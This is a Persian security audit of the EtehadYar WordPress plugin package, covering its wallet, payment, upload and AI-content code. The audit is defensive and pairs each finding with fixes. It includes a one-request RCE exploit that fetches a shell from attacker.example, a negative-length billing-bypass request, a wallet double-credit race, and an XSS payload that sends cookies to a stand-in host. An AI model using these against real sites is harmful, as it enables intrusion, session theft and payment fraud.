# بررسی فنی بستهٔ «اتحادیار» (EtehadYar.zip)

**تاریخ بررسی:** ۸ اکتبر ۲۰۲۶
**منبع:** `Masoumiofficial/EtehadYar` → commit `80fc787` → تنها فایل مخزن: `EtehadYar.zip` (۴۶۰ کیلوبایت)
**روش:** بازکردن بسته، خواندن کامل کد (نه فقط نمونه‌گیری)، ردیابی دستی مسیرهای پول/احراز هویت/آپلود، و بررسی متقابل ادعاهای گزارش‌های تحویل با خودِ کد.

---

## ۰) آنچه در بسته هست

| جزء | فایل | خط PHP | نقش |
|---|---|---|---|
| `etehadyar-core` | ۵۵ | ۱۲٬۹۸۱ | چندمستأجری، OTP، کیف پول، زرین‌پال، REST، سهمیه |
| `etehadyar` (legacy hotfix) | ۷۰ | ۶٬۳۴۸ | موتور تولید محتوای AI، ایجنت‌ها، ویدیو، تلگرام |
| `etehadyar-theme` | ۱۹ | ۱٬۰۶۰ | پوستهٔ RTL، ساخت خودکار صفحات |
| `گزارش‌ها/` | ۱۱ سند | — | تحلیل اولیه + گزارش ۱۰ فاز |
| `پیش‌نمایش/` | ۵ HTML | — | ماک‌آپ ایستا |

جمعاً **۱۴۴ فایل / ۲۰٬۳۸۹ خط PHP**.

> ⚠️ یک نکتهٔ بسته‌بندی قبل از هر چیز: `README-راهنمای-نصب.md` می‌گوید پوشهٔ `بسته-نصب/` شامل «سه فایل zip آمادهٔ نصب» است، ولی در عمل **سه پوشهٔ باز** دارد، نه zip. وردپرس فقط zip بارگذاری می‌کند، پس مرحلهٔ ۱ نصب با بستهٔ فعلی قابل انجام نیست.

---

## ۱) جمع‌بندی مدیریتی

**هستهٔ جدید (`etehadyar-core`) واقعاً خوب نوشته شده است.** لایه‌بندی تمیز، جداسازی مستأجر به‌صورت ساختاری (نه با یادآوری برنامه‌نویس)، `prepare()` روی همهٔ کوئری‌ها، خروجی‌ها escape شده، OTP با طراحی درست، و کامنت‌هایی که «چرا» را توضیح می‌دهند نه «چه». این سطح کیفیت در پلاگین‌های وردپرسی کمیاب است.

**مشکل این است که این هستهٔ خوب، کنار یک پلاگین قدیمیِ پرخطر بسته‌بندی و به یکدیگر سیم‌کشی شده‌اند** — و سیم‌کشی دقیقاً همان چیزی است که خطرناک‌ترین یافتهٔ این بررسی را می‌سازد:

> `Capability_Bridge` در هسته، به هر کاربر عادی پرداخت‌کننده در لحظهٔ درخواست `eaiw_video_build` کپابیلیتی `edit_posts` می‌دهد؛ و `EAIW_Video_Studio_Pro` در پلاگین قدیمی، پسوند فایل دانلودشده را **از URL کاربر** می‌گیرد. ترکیب این دو = **اجرای کد از راه دور (RCE) برای هر عضو سایت.**

### جدول یافته‌ها

| # | عنوان | شدت | جزء |
|---|---|---|---|
| C1 | نوشتن فایل `.php` دلخواه در `uploads/` از مسیر ویدیوساز → RCE | 🔴 بحرانی | legacy + bridge |
| C2 | کردیت دوبارهٔ کیف پول در درخواست‌های همزمان بازگشت از درگاه | 🔴 بحرانی | core |
| C3 | دور زدن کامل صورتحساب با `length` منفی + `background=1` | 🔴 بحرانی | core |
| H1 | کارهای صف‌شده هرگز بازپرداخت نمی‌شوند؛ `run_as()` کد مرده است | 🟠 مهم | core |
| H2 | HTML خروجی مدل با `innerHTML` و فقط یک regex روی صفحه ریخته می‌شود | 🟠 مهم | core + legacy |
| H3 | زنجیرهٔ مهاجرت `init()` در پلاگین قدیمی همگرا نمی‌شود | 🟠 مهم | legacy |
| H4 | `minutely` داخل `if` تودرتو ثبت می‌شود (باگ نهفته؛ `init()` در ریکوئست بعد جبران می‌کند) | 🟡 متوسط | legacy |
| H5 | زمان‌ها مخلوط UTC و محلی ذخیره و بدون تبدیل نمایش داده می‌شوند | 🟡 متوسط | هر دو |
| H6 | توکن ربات تلگرام می‌تواند به پروکسی شخص ثالث برود | 🟡 متوسط | legacy |
| H7 | کلید API گوگل (Gemini) در query string URL | 🟡 متوسط | legacy |
| H8 | «صفحه‌ساز هوشمند» هیچ AI ندارد، ولی قیمت تصویر می‌گیرد | 🟡 متوسط | legacy |
| H9 | نشت فایل در `uploads/`: HTML، ZIP، SVG و پوشهٔ موقت عمومی | 🟡 متوسط | legacy |
| H10 | `cleanup_audio()` الگویی را پاک می‌کند که هرگز ساخته نمی‌شود | 🟢 کم | legacy |
| M1…M14 | ۱۴ نکتهٔ متوسط/کم (بخش ۵) | 🟢 | همه |

---

## ۲) یافته‌های بحرانی

### C1 — اجرای کد از راه دور: پسوند فایل از URL کاربر گرفته می‌شود

`etehadyar/includes/Video/class-video-studio-pro.php:21-29`

```php
$tmp_dir = self::tmp_dir();                       // wp-content/uploads/eaiw-video-tmp-<time>-<rand>/
foreach(array_slice($images,0,4) as $i=>$url){
    $tmp = download_url($url, 25);                // محتوای دلخواه از سرور مهاجم
    if(!is_wp_error($tmp)){
        $ext = pathinfo(parse_url($url, PHP_URL_PATH), PATHINFO_EXTENSION) ?: 'jpg';  // ← پسوند از URL مهاجم
        $new = $tmp_dir . "/scene-".($i+1).".".$ext;
        rename($tmp, $new);                       // ← wp-content/uploads/.../scene-1.php
```

**چرا قابل دسترسی است:**

1. `ajax_video_build` (`includes/Core/class-plugin.php:610-612`) فقط `edit_posts` می‌خواهد.
2. `Capability_Bridge::PRIMITIVE_MAP` (`etehadyar-core/includes/Compat/class-capability-bridge.php:57`) دقیقاً `'eaiw_video_build' => 'edit_posts'` را به **هر عضو فعال پلتفرم** برای مدت همان درخواست می‌دهد.
3. `$images` در هندلر فقط با `sanitize_text_field` تمیز می‌شود (`class-plugin.php:615`) — که URL را دست‌نخورده نگه می‌دارد.
4. `download_url()` از `wp_safe_remote_get()` استفاده می‌کند، پس SSRF به شبکهٔ داخلی بسته است — **اما سرور عمومی خودِ مهاجم کاملاً مجاز است.**

**اکسپلویت (یک درخواست):**

```
POST /wp-admin/admin-ajax.php
action=eaiw_video_build&_ajax_nonce=<nonce معتبر خود کاربر>
title=x&duration=60
script=[{"vo":"a","shot":"b","start":"0:00","end":"0:15"}]
images[]=https://attacker.example/shell.php
```

نتیجه: `wp-content/uploads/eaiw-video-tmp-…/scene-1.php` با محتوای دلخواه مهاجم.

و بدتر — **مسیر دقیق پوشه در همان پاسخ JSON برگردانده می‌شود**، چون `srt_url` از همان `tmp_dir` ساخته می‌شود (`class-video-studio-pro.php:96`):

```php
'srt_url'=> str_replace($upload['basedir'],$upload['baseurl'],$srt_path)
```

یعنی مهاجم `…/eaiw-video-tmp-1730000000-4821/captions.srt` را می‌گیرد و فقط نام فایل را به `scene-1.php` عوض می‌کند. هیچ حدس‌زدنی لازم نیست.

**شرط اجرا:** هاست PHP را داخل `uploads/` اجرا کند. روی nginx (بدون `location` محافظ) و روی Apache تک‌سایتی (وردپرس به‌صورت پیش‌فرض `.htaccess` بازدارنده در uploads نمی‌سازد) این شرط برقرار است. همان فایل additionally داخل `eaiw-video-pack-*.zip` هم گذاشته می‌شود (`make_zip`)، پس حتی اگر اجرا نشود، کپی آن عمومی می‌ماند.

`Temp_Sweeper` هسته این پوشه‌ها را بعد از ۶ ساعت پاک می‌کند — یعنی پنجرهٔ بهره‌برداری تا یک روز کامل باز است و در ضمن، این کلاس **فقط وقتی وجود دارد که هسته نصب باشد**؛ پلاگین قدیمی به‌تنهایی هیچ پاک‌کننده‌ای ندارد.

**هزینهٔ بهره‌برداری:** تقریباً صفر.
- روی نصب **پلتفرمی** (هسته + قدیمی): مهاجم باید یک عضو عادی باشد و ۸۰٬۰۰۰ ریال اعتبار داشته باشد، چون `eaiw_video_build` با operation `video_minute` صورتحساب می‌شود و `Estimator::video_units()` برای صفر/منفی هم حداقل یک دقیقه برمی‌گرداند (پس ترفند C3 اینجا کار نمی‌کند). یک شارژ کوچک = RCE.
- روی نصب **فقط پلاگین قدیمی**: هر کاربر با نقش Author به بالا، رایگان.

**رفع (حداقل):**

```php
$allowed = array( 'jpg', 'jpeg', 'png', 'webp', 'gif' );
$ext = strtolower( (string) pathinfo( (string) wp_parse_url( $url, PHP_URL_PATH ), PATHINFO_EXTENSION ) );
if ( ! in_array( $ext, $allowed, true ) ) {
    continue;                       // یا $ext = 'jpg';
}
```

**رفع (درست):**
- اعتبارسنجی URL با `wp_http_validate_url()` قبل از دانلود؛
- پس از دانلود، بررسی محتوای واقعی با `wp_check_filetype_and_ext()` روی فایل، نه روی URL؛
- کار در `get_temp_dir()` (بیرون از web root) و `finally` برای حذف؛
- و مهم‌تر از همه: **`eaiw_video_build` را از `PRIMITIVE_MAP` بیرون بیاورید** یا آن را به `MANAGE_PLATFORM` محدود کنید. اعطای `edit_posts` به عضو، برای قابلیتی که فایل روی دیسک می‌نویسد، سطح حمله را از «ادمین» به «هر مشتری» می‌آورد.

---

### C2 — کردیت دوبارهٔ کیف پول در بازگشت از درگاه

`etehadyar-core/includes/Billing/class-orders.php:240-330` + `class-wallet.php:203-236`

ترتیب فعلی `handle_return()`:

```
خواندن سفارش (status = pending)
   ↓
verify() → درخواست HTTP به زرین‌پال با timeout=30s     ← پنجرهٔ race بسیار پهن
   ↓
Wallet::credit() → find_by_key() → UPDATE balance → INSERT ledger
   ↓
UPDATE orders SET status = 'paid'
```

`Wallet::credit()` اول موجودی را زیاد می‌کند و **بعد** ردیف دفتر کل را با کلید یکتا می‌نویسد:

```php
$existing = self::find_by_key( $args['idempotency_key'] );   // line 203 — هر دو null می‌گیرند
if ( $existing ) return $existing;
...
$updated = $wpdb->query( "UPDATE {$table} SET balance = balance + %d ..." );  // line 216 — هر دو اجرا می‌شوند
...
return self::record( $user_id, ... );                       // line 236 — INSERT دوم با duplicate key می‌میرد
```

اینکه `idempotency_key` در `ddl_transactions()` UNIQUE است کمکی نمی‌کند، چون **INSERT بعد از UPDATE موجودی است**؛ و `record()` هم نتیجهٔ `$wpdb->insert` را بررسی نمی‌کند، پس شکست بی‌صدا است.

**سناریوی عملی:** کاربر یک بار ۱۰۰٬۰۰۰ ریال پرداخت می‌کند، سپس N درخواست موازی به
`/?etehadyar_payment=return&Authority=X&Status=OK`
می‌فرستد. همه `status='pending'` می‌بینند، همه از زرین‌پال تأیید می‌گیرند (یکی code 100، بقیه code 101 که عمداً موفق تلقی می‌شود)، و همه موجودی را افزایش می‌دهند. نتیجه: **N برابر شارژ با یک پرداخت**، و فقط یک ردیف در دفتر کل.

همین الگو در `charge()` (خط ۲۹۰) هم هست، با جهت برعکس: دو کار موازی با یک کلید، دو بار از کاربر پول کم می‌کنند.

کامنت خود کد می‌گوید «Debits are atomic… no negative balance is possible» — آن بخش درست است (شرط `balance >= %d` داخل WHERE). اما **idempotency اتمی نیست** و ادعای «exactly once» فقط برای تکرارهای *متوالی* صادق است، نه *همزمان*.

**رفع (کمینه‌ترین تغییر — از UNIQUE موجود استفاده کن):**
ردیف دفتر کل را **اول** بنویس؛ خودش قفل می‌شود:

```php
$ok = $wpdb->insert( $txn_table, array( ..., 'idempotency_key' => $key, 'amount' => $amount ) );
if ( ! $ok ) {
    $dup = self::find_by_key( $key );
    return $dup ? $dup : new \WP_Error( 'etehadyar_wallet_race', '…', array( 'status' => 409 ) );
}
// حالا و فقط حالا:
$wpdb->query( "UPDATE {$table} SET balance = balance + %d …" );
```

**رفع (بهتر):** قبل از صدا زدن درگاه، سفارش را اتمی claim کن — یک UPDATE شرطی، قفل ردیف InnoDB:

```php
$claimed = $wpdb->query( $wpdb->prepare(
    "UPDATE `{$orders}` SET status = %s WHERE id = %d AND status = %s",
    'settling', (int) $order['id'], self::STATUS_PENDING
) );
if ( 1 !== $claimed ) { return /* همان پاسخ repeat */; }
```

ضمناً `record()` باید خطای `insert` را بررسی کند و در صورت شکست، کل عملیات را داخل transaction برگرداند — در غیر این صورت موجودی و دفتر کل برای همیشه از هم واگرا می‌مانند.

---

### C3 — دور زدن صورتحساب: `length` منفی + `background=1`

`etehadyar-core/includes/Billing/class-ajax-billing.php:179` و `class-estimator.php:97`

```php
// Estimator
public static function content_units( $words ) {
    return max( 0, (int) $words ) / 100;      // ورودی منفی → 0
}

// Ajax_Billing::maybe_reserve()
$quantity = (float) call_user_func( $config['estimate'], wp_unslash( $_POST ) );
$cost     = Pricing::cost( $config['operation'], $quantity );
if ( $cost <= 0 ) {
    return;                                    // ← بدون شارژ، ولی هندلر اجرا می‌شود
}
```

و `Pricing::cost()` فقط وقتی `0.0 === $quantity` باشد صفر برمی‌گرداند — که دقیقاً با `length=-1` اتفاق می‌افتد.

یعنی:

```
action=eaiw_factory_generate&length=-1&background=1&prompt=<هر چیز>
```

→ برآورد صفر → **هیچ کسری از کیف پول انجام نمی‌شود** → هندلر کار را در صف می‌گذارد → `reconcile()` هم زود return می‌کند:

```php
// class-ajax-billing.php:372
if ( ! empty( $data['queued'] ) ) { return; }   // «بعداً توسط worker صورتحساب می‌شود»
```

و worker هیچ منطق صورتحسابی ندارد (پلاگین قدیمی حتی کلاس `Wallet` را نمی‌شناسد — grep روی `etehadyar/` برای `Wallet|refund` صفر نتیجه می‌دهد). پس **تولید محتوا کاملاً رایگان می‌شود**، در حالی که هزینهٔ واقعی آن از جیب صاحب پلتفرم به OpenAI/GapGPT پرداخت شده.

در مسیر همگام (بدون `background`) باگ خودبه‌خود ترمیم می‌شود چون `reconcile()` بر اساس تعداد کلمهٔ واقعی پس‌کسر می‌کند؛ مشکل فقط در مسیر صف است — که البته مسیر مورد علاقهٔ مهاجم است.

**رفع:**
```php
$quantity = max( 1, (float) call_user_func( $config['estimate'], wp_unslash( $_POST ) ) );
...
if ( $cost <= 0 ) {
    wp_send_json_error( array( 'message' => __( 'مقدار درخواست نامعتبر است.' ) ), 400 );   // نه «اجرای رایگان»
}
```
یعنی «هزینهٔ صفر» باید به معنی **رد درخواست** باشد، نه «اجرا بدون صورتحساب». به‌علاوه `Estimator::content_units()` باید ورودی منفی را نامعتبر بداند، نه صفر.

---

## ۳) یافته‌های مهم

### H1 — کارهای صف‌شده: نه بازپرداخت، نه مالکیت

دو ادعا در کد هست که پیاده‌سازی نشده‌اند:

**(الف)** `class-ajax-billing.php:370`: «A queued job … will be billed by the worker when it actually runs.» — worker هیچ billing ندارد. نتیجه: کار صف‌شده‌ای که **شکست می‌خورد** پول کاربر را برنمی‌گرداند. `EAIW_Job_Queue::run_next()` (خط ۴۴-۶۰) سه بار تلاش می‌کند و بعد `failed` می‌گذارد؛ هیچ‌جا به کیف پول نگاه نمی‌کند. این نقض مستقیم وعدهٔ README («کسر خودکار اعتبار» در کنار «بازگشت وجه») است.

**(ب)** `class-legacy-bridge.php:168` — `Legacy_Bridge::run_as()` با docblock کامل («Background workers have no current user, so the job's owner must be restored…») نوشته شده و **هیچ‌جا صدا زده نمی‌شود**. grep روی کل بسته: فقط دو خط تعریف. نتیجه در cron:

- `Tenant_Context::current_id()` صفر است → `stamp_owner_on_insert()` دست به کوئری نمی‌زند → ردیف‌های `eaiw_usage`، `eaiw_activity_log`، `eaiw_support_history` با `user_id = 0` نوشته می‌شوند.
- `wp_insert_post()` داخل `generate_full()` بدون `post_author` → پیش‌نویس با نویسندهٔ ۰؛ `force_ownership()` هم فقط روی اکشن AJAX فعال است، پس در cron اجرا نمی‌شود.
- `guard_object_ids()` هم در cron اجرا نمی‌شود → `post_id` داخل payload بدون هیچ بررسی مالکیتی به `get_post()` می‌رود و عنوان/متن **پست دیگران** را داخل پرامپت کپی می‌کند. (در مسیر AJAX این نشتی درست بسته شده؛ در مسیر صف باز مانده.)

**رفع:** دو hook در worker قدیمی اضافه کن و بقیه را در هسته بنویس:

```php
// EAIW_Job_Queue::run_next()
do_action( 'eaiw_job_before', $job );
...
$result = apply_filters( 'eaiw_job_result', $result, $job );
```
و در هسته:
```php
add_action( 'eaiw_job_before', function ( $job ) {
    Tenant_Context::as_tenant( (int) $job['user_id'], function () { /* context only */ } );
    // بهتر: نگهداری override تا پایان کار
} );
```
به‌علاوهٔ بازپرداخت در `eaiw_job_result` وقتی `is_wp_error($result)` است.

### H2 — XSS: خروجی مدل مستقیم به DOM

`class-studio-shortcode.php:322-326`:

```js
// Server-generated markup is inserted as text first, then parsed, so a
// malformed provider response cannot inject script into the page.
var art = document.createElement('div');
art.innerHTML = (data.html || (data.article && data.article.html) || '')
    .replace(/<script[\s\S]*?<\/script>/gi, '');
```

کامنت **نادرست** است: هیچ «اول متن، بعد پارس» در کار نیست؛ `innerHTML` مستقیماً HTML پارس می‌کند. و حذف `<script>` با regex جلوی هیچ‌کدام از این‌ها را نمی‌گیرد:

```html
<img src=x onerror="fetch('//evil/'+document.cookie)">
<svg onload=…>   <iframe srcdoc=…>   <body onpageshow=…>
```

سمت سرور هم `EAIW_Omnichannel_Factory::clean_html()` (`class-omnichannel-factory.php:126-139`) فقط fence مارک‌داون و `**` را پاک می‌کند — **هیچ `wp_kses` در کار نیست**. `wp_insert_post()` برای کاربر بدون `unfiltered_html` کساس می‌زند، ولی آنچه در استودیو رندر می‌شود پاسخ AJAX است، نه محتوای پست. همین HTML در ستون `result` جدول jobs هم ذخیره و بعداً توسط `Studio_Controller::shape()` (کلید `html` در allowlist) دوباره به مرورگر برگردانده می‌شود.

**رفع (یک خط، سمت سرور):** در `clean_html()` پایان کار `return wp_kses_post( trim( $html ) );`
**رفع (سمت کلاینت):** یا `textContent`، یا `DOMParser` + حذف گره‌های خطرناک، یا DOMPurify. و کامنت گمراه‌کننده را اصلاح کن — کامنت غلط بدتر از نبود کامنت است، چون بازبین بعدی را آرام می‌کند.

### H3 — زنجیرهٔ مهاجرت پلاگین قدیمی همگرا نمی‌شود

`etehadyar/includes/Core/class-plugin.php:91-311`، داخل `init()` یعنی **هر درخواست**:

```php
$dbv = (int)get_option('eaiw_db_version', 600);      // یک بار خوانده می‌شود
if ($dbv < 673)  { … update_option('eaiw_db_version', 673);  }
if ($dbv < 689)  { … update_option('eaiw_db_version', 689);  }
…
if ($dbv < 6119) { … update_option('eaiw_db_version', 6119); }
if ($dbv < 6113) { … update_option('eaiw_db_version', 6113); }
…
if ($dbv < 6101 && (int)get_option('eaiw_db_version',0) < 6102) { … }   // ← band-aid
…
if ($dbv < 6811) { … update_option('eaiw_db_version', 6811); }
```

سه مشکل:

1. **شماره‌ها یکنوا نیستند** (۶۱۱۹ → ۶۱۱۳ → ۶۱۰۹ → … → ۶۹۲ → ۶۸۱۱) و همه یک option را بازنویسی می‌کنند، پس آخرین بلوک برنده است.
2. بلوک `6101` option را **دوباره وسط زنجیره می‌خواند**؛ تا آن لحظه بلوک `6119` آن را به ۶۱۱۹ تغییر داده، پس شرط `6119 < 6102` غلط است و **این بلوک برای هر سایتی که از نسخهٔ قدیمی ارتقا می‌یابد برای همیشه skip می‌شود** — یعنی همان `dbDelta` جدول jobs هرگز اجرا نمی‌شود. این دقیقاً همان کلاس باگی است که در گزارش فاز ۱۰ به‌عنوان M1 («ستون گم‌شده → خطا در هر بارگذاری صفحه») توصیف شده، ولی فقط در هسته رفع شده و در پلاگین قدیمی سر جایش است.
3. روی نصب تازه (`eaiw_db_version = 6130` از activator) فقط بلوک `< 6811` اجرا می‌شود و نسخه را به **۶۸۱۱** پایین می‌آورد؛ بعد از آن همهٔ شرط‌ها غلط می‌شوند و بقیهٔ بلوک‌ها هرگز اجرا نمی‌شوند.

جالب این‌جاست که `Migrator` هسته در docblock خودش دقیقاً همین بیماری را توصیف می‌کند («migration blocks were written in descending order and each one overwrote the stored DB version») و راه‌حل درست را هم نوشته — فقط آن را به پلاگینی که کنارش بسته‌بندی شده اعمال نکرده است.

**رفع:** کل زنجیره را حذف کن و مهاجرت‌های پلاگین قدیمی را به registry شماره‌دار `Migrator` منتقل کن (یا دست‌کم یک `EAIW_Migrator` مشابه با `applied_migrations` آرایه‌ای).

### H4 — `minutely` در `if` تودرتو ثبت می‌شود

`etehadyar/includes/Core/class-activator.php:238-244`:

```php
add_filter('cron_schedules', function($schedules){
    if (!isset($schedules['fifteen_minutes'])) {
        $schedules['fifteen_minutes'] = ['interval'=>900, 'display'=>'هر ۱۵ دقیقه'];
    if (!isset($schedules['minutely'])) $schedules['minutely'] = ['interval'=>60, 'display'=>'هر دقیقه'];
    }                                                        // ← آکولاد بسته‌شده اینجاست
    return $schedules;
});
```

ثبت `minutely` **داخل** شرط `fifteen_minutes` است. اگر هر پلاگین دیگری (یا فعال‌سازی مجدد) قبلاً `fifteen_minutes` را ثبت کرده باشد، `minutely` ثبت نمی‌شود و:

```php
wp_schedule_event(time()+60,'minutely','eaiw_jobs_cron');   // ← بی‌صدا false برمی‌گرداند
```

یعنی در لحظهٔ فعال‌سازی، `wp_schedule_event(time()+60,'minutely','eaiw_jobs_cron')` بی‌صدا `false` برمی‌گرداند و رویداد زمان‌بندی نمی‌شود.

**اما بررسی دقیق‌تر، شدت را پایین می‌آورد:** `EAIW_Plugin::init()` (که به هوک `init` وصل است — `class-plugin.php:14`) هم فیلتر درست را ثبت می‌کند و هم پنج رویداد را با `if (!wp_next_scheduled(...))` دوباره زمان‌بندی می‌کند (`class-plugin.php:78-82`)، از جمله `eaiw_jobs_cron`. پس خرابی activator در **اولین ریکوئست بعد از فعال‌سازی** جبران می‌شود و صف برای همیشه نمی‌خوابد. این یک باگ نهفته است، نه یک قطعی فعال — مگر اینکه `init()` خودش قبل از زمان‌بندی بمیرد (مثلاً خطای fatal در زنجیرهٔ مهاجرت H3 که درست بالای همان خط‌ها اجرا می‌شود).

**رفع:** یک آکولاد را جابه‌جا کن (انجام شد) و این فیلتر تکراری را حذف کن — دو نسخه از یک منطق در دو فایل، همان چیزی است که بعداً واگرا می‌شود. نسخهٔ activator باید فقط مسئول ثبت schedule باشد و زمان‌بندی رویدادها به یک متد مشترک منتقل شود.

### H5 — زمان‌ها: نصف UTC، نصف محلی

| جدول | نحوهٔ نوشتن |
|---|---|
| `etehadyar_wallet_txn`, `etehadyar_orders`, `eaiw_jobs` | `current_time('mysql', true)` → **UTC** |
| `etehadyar_tenants`, `etehadyar_audit` | `current_time('mysql')` → **محلی** |
| `etehadyar_otp` | `gmdate()` → UTC |

و نمایش:

```php
// class-wallet-shortcode.php:126
echo esc_html( mysql2date( 'Y/m/d H:i', $item['created_at'] ) );
```

`mysql2date()` رشته را در منطقهٔ زمانی سایت تفسیر می‌کند؛ دادن رشتهٔ UTC به آن یعنی **زمان تراکنش‌ها برای کاربر ایرانی ۳ ساعت و نیم عقب‌تر از واقعیت نمایش داده می‌شود**. برای سامانه‌ای که مشتری بابت یک تراکنش خاص اعتراض می‌کند، این مستقیماً به اعتماد لطمه می‌زند. ضمناً مقایسهٔ بین‌جدولی (مثلاً «پرداخت‌های ۳۰ روز اخیر» در `class-billing-screen.php:317`) روی ستون‌هایی با دو مبنای متفاوت انجام می‌شود.

**رفع:** همه‌جا `current_time('mysql', true)` (یا بهتر، `gmdate`) ذخیره کن و در نمایش `wp_date( $format, strtotime( $utc . ' UTC' ) )` یا `get_date_from_gmt()`. و یک تست که این دو را به هم قفل کند.

### H6 — توکن ربات تلگرام به پروکسی شخص ثالث

`etehadyar/includes/Social/class-telegram.php:9-30` — گزینهٔ `eaiw_telegram_proxy` می‌تواند کل URL (شامل توکن) را به یک سرویس عمومی بفرستد؛ خود کامنت نمونه می‌آورد:

```php
// برای allorigins: https://api.allorigins.win/raw?url=
if(strpos($proxy,'?url=')!==false) return $proxy . urlencode($base);   // $base شامل bot<TOKEN> است
```

این برای هاست‌های ایرانی که `api.telegram.org` را بسته‌اند راه‌حل عملی است، ولی یعنی توکن ربات — که کنترل کامل کانال را می‌دهد — به یک سرور ناشناس سپرده می‌شود و احتمالاً در لاگ آن می‌ماند. **رفع:** یا این قابلیت را حذف کن، یا در UI با هشدار قرمز صریح («توکن شما به سرور واسط ارسال می‌شود») و allowlist دامنه همراهش کن؛ و توکن را در لاگ `EAIW_Logger` ماسک کن.

### H7 — کلید Gemini در URL

`etehadyar/includes/Providers/class-ai-client.php:114`:

```php
$endpoint="https://generativelanguage.googleapis.com/v1beta/models/{$model}:generateContent?key={$key}";
```

کلید در query string یعنی در لاگ پروکسی، لاگ HTTP وردپرس، و هر `WP_DEBUG_LOG` که URL را چاپ کند. سه پرووایدر دیگر از هدر استفاده می‌کنند. ضمناً `$model` بدون `rawurlencode()` در URL درج می‌شود.
**رفع:** `'headers' => array( 'x-goog-api-key' => $key )` و `rawurlencode( $model )`.

### H8 — «صفحه‌ساز هوشمند» هوش ندارد

`etehadyar/includes/Architect/class-architect.php` — `generate($brief)` هیچ درخواستی به هیچ پرووایدری نمی‌زند؛ سه section **هاردکد** با متن‌های ثابت بازاریابی می‌سازد و `$brief` را فقط به‌عنوان subtitle هیرو درج می‌کند. با این حال `Ajax_Billing::billable_actions()` آن را با operation `image` (۲۰٬۰۰۰ ریال) صورتحساب می‌کند.

این دقیقاً همان الگویی است که گزارش تحویل با افتخار حذفش کرده («آمار داشبورد ساختگی بود»)، ولی در یک جای دیگر باقی مانده. یا AI واقعی وصل کن، یا رایگانش کن و اسمش را عوض کن.

### H9 — نشت فایل در `uploads/`

هر اجرای ویدیوساز در پوشهٔ عمومی می‌نویسد: `preview.html` (یک سند HTML مستقل با `<script>` روی origin سایت)، `eaiw-video-pack-*.zip`، `timeline.json`، `captions.srt` و تصاویر دانلودشده. هیچ‌کدام در پاسخ پاک نمی‌شوند؛ فقط `Temp_Sweeper` پوشهٔ موقت را بعد از ۶ ساعت می‌برد و **ZIP و preview.html در ریشهٔ uploads می‌مانند** (آن‌ها داخل `tmp_dir` نیستند).

به‌طور مشابه `Vision_Studio::save_svg_to_media()` با `wp_upload_bits()` فایل SVG می‌سازد — یعنی بدون عبور از `upload_mimes`، روی سایتی که ممکن است عمداً SVG را بسته باشد. (خودِ XSS که گزارش C5 رد کرد واقعاً رد است: `esc_html` روی هر سه مقدار متنی اعمال شده. این بخش از گزارش تحویل درست بود.)

**رفع:** این artefactها را attachment ثبت کن یا در مسیر محافظت‌شده بنویس؛ `preview.html` را با `Content-Disposition: attachment` سرو کن؛ و ZIP/preview را هم به `Temp_Sweeper` اضافه کن.

### H10 — `cleanup_audio()` هیچ‌وقت چیزی پیدا نمی‌کند

`etehadyar/includes/Soul/class-support-request.php:9`:

```php
$files=glob($base.'support-request-*');
```

ولی آپلود صوت از `/support/audio` با `wp_handle_upload()` انجام می‌شود که نام اصلی فایل را نگه می‌دارد (`blob.webm`, `audio-1.mp3`, …). هیچ‌جا فایلی با پیشوند `support-request-` ساخته نمی‌شود (grep روی کل بسته: فقط همین یک خط). پس cron روزانهٔ `eaiw_support_audio_cleanup` هرگز چیزی پاک نمی‌کند و فایل‌های صوتی ۸ مگابایتی کاربران ناشناس برای همیشه می‌مانند.

---

## ۴) نکتهٔ ساختاری: محافظت‌ها در افزونهٔ اشتباهی زندگی می‌کنند

`Endpoint_Guard`، `Temp_Sweeper`، `Ajax_Billing`، `Capability_Bridge` و `Legacy_Bridge` **همه در هسته‌اند**، ولی کد آسیب‌پذیر در **پلاگین قدیمی** است. نتیجه:

- اگر کسی فقط پلاگین قدیمی را نصب کند (که README صراحتاً اجازه می‌دهد: «افزونهٔ قدیمی (موتور AI)»)، آنگاه `/support/audio` — آپلود ۸ مگابایتی عمومی که هر بار Whisper را صدا می‌زند — **بدون هیچ محدودیت نرخی** باز است. همان C4 که در گزارش «رفع‌شده» اعلام شده، در واقعیت *پوشانده* شده، نه رفع.
- اگر کسی فقط هسته را نصب کند، `Ajax_Billing` هیچ هندلری برای پوشاندن ندارد و بی‌اثر است.

این جفت‌شدگی باید **صریح** شود: یا پلاگین قدیمی یک `Requires Plugins: etehadyar-core` در هدر بگیرد (وردپرس ۶.۵+) و در `plugins_loaded` با `admin_notices` قفل شود، یا محدودیت نرخ و پاک‌کنندهٔ موقت به خود پلاگین قدیمی منتقل شوند. وضع فعلی «امنیت وابسته به ترتیب نصب» است.

---

## ۵) نکات متوسط و کم

| # | موضوع | محل |
|---|---|---|
| M1 | `Rate_Limiter::consume()` با get/set ترنزینت غیراتمی است؛ دو درخواست موازی هر دو عبور می‌کنند | `class-rate-limiter.php:45-50` |
| M2 | `Wallet::find_by_key()` کلید را بدون scope کاربر جست‌وجو می‌کند؛ namespace سراسری یعنی اگر روزی کلیدی از ورودی کاربر ساخته شود، یک کاربر می‌تواند تراکنش دیگری را block کند | `class-wallet.php:434` |
| M3 | `card_pan` در جدول orders ذخیره می‌شود. زرین‌پال معمولاً ماسک‌شده برمی‌گرداند، ولی هیچ اعتبارسنجی‌ای وجود ندارد؛ یک `preg_match` برای اطمینان از ماسک‌بودن اضافه کن (PCI) | `class-orders.php:312` |
| M4 | `EAIW_Vault::key()` در نبود salt به ثابت `'etehadwp'.'supernatural'` برمی‌گردد — یکسان برای همهٔ نصب‌ها. هسته این را درست حل کرده (`siteurl . ABSPATH`)؛ قدیمی را هم همسان کن | `class-vault.php:4-8` |
| M5 | `EAIW_AI_Client::providers()` داخل حلقهٔ fallback چند بار صدا زده می‌شود و هر بار ۴ کلید را decrypt می‌کند؛ نتیجه را در یک متغیر محلی بگیر | `class-ai-client.php:29-40` |
| M6 | `ffmpeg_available()`: اگر `exec` غیرفعال باشد، `$ret` صفر می‌ماند و تابع `true` برمی‌گرداند. اول `function_exists('exec')` را چک کن | `class-video-studio-pro.php:112` |
| M7 | `read_buffer()` در `Ajax_Billing` کل بافر را `json_decode` می‌کند؛ یک warning/notice کوچک PHP (مثلاً در حالت `WP_DEBUG`) پاسخ را غیرقابل‌پارس می‌کند → «مبهم = شکست» → **بازپرداخت برای کاری که واقعاً انجام و پولش به پرووایدر داده شده**. بافر اختصاصی خودت را با `ob_start()` ایزوله کن | `class-ajax-billing.php:464` |
